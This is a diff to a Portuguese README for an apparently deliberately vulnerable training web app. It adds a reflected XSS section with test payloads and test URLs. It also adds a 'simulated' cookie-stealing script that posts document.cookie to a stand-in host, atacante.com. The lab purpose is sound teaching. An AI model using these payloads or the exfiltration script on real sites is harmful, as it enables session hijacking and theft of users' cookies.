@@ -41,7 +41,16 @@ Demonstrar vulnerabilidades comuns em aplicações web para:
 - **Localização:** API `/api/messages`
 - **Descrição:** Possível acesso a mensagens de outros usuários
 
-### 7. Buffer Overflow (Binário C)
+### 7. Cross-Site Scripting (XSS) Reflected
+- **Localização:** Endpoints `/create-message` e `/view-message`
+- **Descrição:** Entrada do usuário é refletida sem sanitização adequada
+- **Impacto:** Roubo de cookies, session hijacking, execução de JavaScript malicioso
+- **Payloads de teste:**
+  - `<script>alert('XSS!')</script>`
+  - `<img src=x onerror=alert(document.cookie)>`
+  - `<svg onload=confirm('Cookie: ' + document.cookie)>`
+
+### 8. Buffer Overflow (Binário C)
 - **Localização:** Ferramenta administrativa (`admin_tool`)
 - **Descrição:** Vulnerabilidade de buffer overflow com possibilidade de ROP
 - **Função alvo:** `acessar_shell()` - concede shell administrativa
@@ -156,12 +165,47 @@ Esta aplicação foi criada exclusivamente para:
 - **Binário vulnerável:** C (admin_tool) com buffer overflow
 - **Exploit development:** Python 3 (exploit_generator.py)
 
+## 🎯 Demonstrações de XSS
+
+### Cenários de Ataque XSS Reflected
+
+1. **Formulário de Mensagens:**
+   - Acesse `/messages` 
+   - No formulário "Criar Nova Mensagem", insira payloads XSS no título ou conteúdo
+   - Exemplo: `<script>alert('XSS no título!')</script>`
+
+2. **Busca de Mensagens:**
+   - Acesse `/view-message`
+   - Use os campos de busca com payloads XSS
+   - Exemplo: `/view-message?search=<img src=x onerror=alert(document.cookie)>`
+
+3. **Cookie Stealing (Simulação):**
+   ```javascript
+   <script>
+   fetch('http://atacante.com/steal.php', {
+       method: 'POST',
+       body: 'cookie=' + document.cookie
+   });
+   </script>
+   ```
+
+4. **Página de Exemplos:**
+   - Acesse `/xss-examples` para ver demonstrações interativas
+   - Contém payloads prontos e explicações técnicas
+
+### URLs de Teste Direto
+
+- Basic XSS: `/view-message?search=<script>alert('XSS!')</script>`
+- Cookie Display: `/view-message?search=<svg onload=confirm(document.cookie)>`
+- Image XSS: `/view-message?highlight=<img src=x onerror=alert('IMG XSS')>`
+
 ## 📚 Recursos Educativos
 
 Para aprender mais sobre as vulnerabilidades demonstradas:
 
 - [OWASP Top 10](https://owasp.org/www-project-top-ten/)
 - [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+- [XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
 - [Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
 
 ## ⚖️ Licença
